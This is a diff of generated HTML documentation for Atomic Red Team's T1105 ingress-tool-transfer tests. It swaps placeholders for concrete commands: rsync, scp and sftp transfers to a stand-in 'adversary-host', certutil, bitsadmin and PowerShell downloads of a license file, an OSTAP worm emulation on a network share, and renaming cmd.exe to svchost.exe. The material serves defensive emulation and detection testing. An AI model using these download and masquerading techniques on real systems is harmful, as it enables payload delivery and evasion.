@@ -658,7 +658,7 @@
 <p><strong>Supported Platforms:</strong> linux, macos</p>
 <div class="section" id="attack-commands-run-with-bash">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code><a class="headerlink" href="#attack-commands-run-with-bash" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rsync -r <span class="c1">#{local_path} #{username}@#{remote_host}:#{remote_path}</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -676,7 +676,7 @@
 <p><strong>Supported Platforms:</strong> linux, macos</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rsync -r <span class="c1">#{username}@#{remote_host}:#{remote_path} #{local_path}</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -694,7 +694,7 @@
 <p><strong>Supported Platforms:</strong> linux, macos</p>
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>scp <span class="c1">#{local_file} #{username}@#{remote_host}:#{remote_path}</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -712,7 +712,7 @@
 <p><strong>Supported Platforms:</strong> linux, macos</p>
 <div class="section" id="id3">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>scp <span class="c1">#{username}@#{remote_host}:#{remote_file} #{local_path}</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -730,7 +730,7 @@
 <p><strong>Supported Platforms:</strong> linux, macos</p>
 <div class="section" id="id4">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sftp <span class="c1">#{username}@#{remote_host}:#{remote_path} &lt;&lt;&lt; $&#39;put #{local_file}&#39;</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sftp victim@victim-host:/tmp/victim-files/ <span class="o">&lt;&lt;&lt;</span> <span class="s1">$&#39;put /tmp/adversary-sftp&#39;</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -748,7 +748,7 @@
 <p><strong>Supported Platforms:</strong> linux, macos</p>
 <div class="section" id="id5">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sftp <span class="c1">#{username}@#{remote_host}:#{remote_file} #{local_path}</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -766,7 +766,7 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -784,11 +784,11 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$datePath</span> <span class="p">=</span> <span class="s2">&quot;certutil-</span><span class="p">$(</span><span class="nb">Get-Date</span> <span class="n">-format</span> <span class="n">yyyy_MM_dd</span><span class="p">)</span><span class="s2">&quot;</span>
-<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$datePath</span> <span class="n">-ItemType</span> <span class="n">Directory</span>
-<span class="nb">Set-Location</span> <span class="nv">$datePath</span>
-<span class="n">certutil</span> <span class="n">-verifyctl</span> <span class="n">-split</span> <span class="o">-f</span> <span class="c">#{remote_file}</span>
-<span class="nb">Get-ChildItem</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-notlike</span> <span class="s2">&quot;*.txt&quot;</span><span class="p">}</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span> <span class="nb">Move-Item</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="n">-Destination</span> <span class="c">#{local_path} }</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>$datePath = &quot;certutil-$(Get-Date -format yyyy_MM_dd)&quot;
+New-Item -Path $datePath -ItemType Directory
+Set-Location $datePath
+certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+Get-ChildItem | Where-Object {$_.Name -notlike &quot;*.txt&quot;} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -807,7 +807,7 @@ This technique is used by Qbot malware to download payloads.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id6">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -826,7 +826,7 @@ This technique is used by multiple adversaries and malware families.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id7">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&quot;#{remote_file}&quot;</span><span class="p">,</span> <span class="s2">&quot;#{destination_path}&quot;</span><span class="p">)</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;$env:TEMP\Atomic-license.txt&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -841,10 +841,11 @@ This technique is used by multiple adversaries and malware families.</p>
 <div class="section" id="atomic-test-11-ostap-worming-activity">
 <h3>Atomic Test #11 - OSTAP Worming Activity<a class="headerlink" href="#atomic-test-11-ostap-worming-activity" title="Permalink to this headline">¶</a></h3>
 <p>OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id8">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>pushd #{destination_path}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>pushd \\localhost\C$
 echo var fileObject = WScript.createobject(&quot;Scripting.FileSystemObject&quot;);var newfile = fileObject.CreateTextFile(&quot;AtomicTestFileT1105.js&quot;, true);newfile.WriteLine(&quot;This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.&quot;);newfile.Close(); &gt; AtomicTestT1105.js
 CScript.exe AtomicTestT1105.js //E:JScript
 del AtomicTestT1105.js /Q &gt;nul 2&gt;&amp;1
@@ -865,7 +866,8 @@ popd
 <h3>Atomic Test #12 - svchost writing a file to a UNC path<a class="headerlink" href="#atomic-test-12-svchost-writing-a-file-to-a-unc-path" title="Permalink to this headline">¶</a></h3>
 <p>svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
 Upon successful execution, this will rename cmd.exe as svchost.exe and move it to <code class="docutils literal notranslate"><span class="pre">c:\</span></code>, then execute svchost.exe with output to a txt file.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id9">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>copy C:\Windows\System32\cmd.exe C:\svchost.exe
